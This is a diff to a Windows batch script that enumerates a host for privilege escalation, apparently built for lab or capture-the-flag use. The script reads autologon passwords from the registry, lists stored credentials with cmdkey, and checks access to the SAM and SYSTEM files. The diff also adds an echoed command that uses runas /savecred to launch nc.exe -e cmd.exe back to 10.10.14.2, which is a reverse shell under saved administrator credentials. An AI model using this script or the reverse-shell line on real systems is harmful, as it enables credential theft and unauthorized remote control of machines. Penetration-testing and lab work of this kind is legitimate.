@@ -95,18 +95,24 @@ wmic sysaccount list
 echo --- Identify any local system accounts that are enabled ---
 wmic USERACCOUNT WHERE "Disabled=0 AND LocalAccount=1" GET Name
 
-echo --- Rgistry Entries for Autologon ---
+echo --- Registry Entries for Autologon ---
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 
 echo -- Password Policy ---
 net group
 
 echo --- Credential Manager:  List stored credentials ---
-cmdkey /list
-echo C:\Users\username\AppData\Local\Microsoft\Credentials\
+echo
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
-echo C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+echo
+echo --- RunAs? ---
+echo
+echo "If there are entries, it means that we may able to runas certain user who stored his cred in windows"
+echo "runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe""
+echo
+cmdkey /list
 
 echo ======================================PERMISSIONS=========================================
 echo --- Access to SAM and SYSTEM Files ---
@@ -180,12 +186,6 @@ if defined access_chk_path (
 			echo accesschk.exe not found on host
 			sc query state= all | find "SERVICE_NAME"
 		)
-
-echo ======================================Mimikatz============================================
-echo Mimikatz Placeholder
-
-echo ======================================Incognito===========================================
-echo Incognito Placeholder
 
 echo ======================================GPO=================================================
 
